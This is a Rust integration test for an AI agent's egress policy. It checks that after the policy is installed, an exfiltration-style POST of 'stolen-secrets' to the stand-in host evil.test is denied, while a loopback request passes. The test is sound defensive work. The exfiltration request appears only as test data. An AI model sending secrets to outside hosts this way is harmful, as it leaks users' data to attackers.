//! End-to-end proof that wiring `install_egress_policy` makes the B1 chokepoint
//! actually bite. The pure classifier and `AgentEgressPolicy` are unit-tested in
//! `src/egress/`; this test covers the seam those unit tests can't reach: that
//! installing the policy mutates the process-global state every `EgressClient`
//! consults at send time, so a client built *after* install denies exfil traffic
//! and lets local traffic through.
//!
//! The global policy is one-shot per process. cargo-nextest runs each test in
//! its own process, so this file deliberately holds a SINGLE test — a second
//! test installing a different policy in the same `cargo test` process would
//! lose the race and assert against the wrong posture.

use wcore_config::config::Config;

#[tokio::test]
async fn enforcing_install_denies_exfil_and_allows_local() {
    // An enforcing config (security.enabled defaults true) with a real provider
    // host so the allowlist is well-formed.
    let config = Config {
        base_url: "https://api.anthropic.com".to_string(),
        ..Config::default()
    };
    assert!(
        config.security.enabled,
        "security must default on — the C8 off switch is opt-out only"
    );

    wcore_agent::egress::install_egress_policy(&config);
    assert!(
        wcore_egress::global_policy_installed(),
        "install must populate the process-global policy"
    );

    // A fresh default client built AFTER install must consult the installed
    // policy. An exfil-shaped POST to a non-allowlisted external host is denied
    // BEFORE any network I/O — the error is `Denied`, not a transport failure.
    let client = wcore_egress::EgressClient::new();
    let err = client
        .post("https://evil.test/collect")
        .body("stolen-secrets")
        .send()
        .await
        .expect_err("exfil POST to a non-allowlisted host must be denied");
    assert!(
        err.is_denied(),
        "blocked exfil must surface as EgressError::Denied, got: {err}"
    );

    // A local destination is not exfil and must pass the gate. It reaches the
    // network layer (and fails to connect on a dead loopback port) — proving the
    // policy ALLOWED it rather than denying it. Port 1 is reserved/unbound.
    let local_err = client
        .post("http://127.0.0.1:1/ingest")
        .body("local-payload")
        .send()
        .await
        .expect_err("nothing is listening on 127.0.0.1:1");
    assert!(
        !local_err.is_denied(),
        "local destination must pass the gate (transport error, not Denied), got: {local_err}"
    );
}
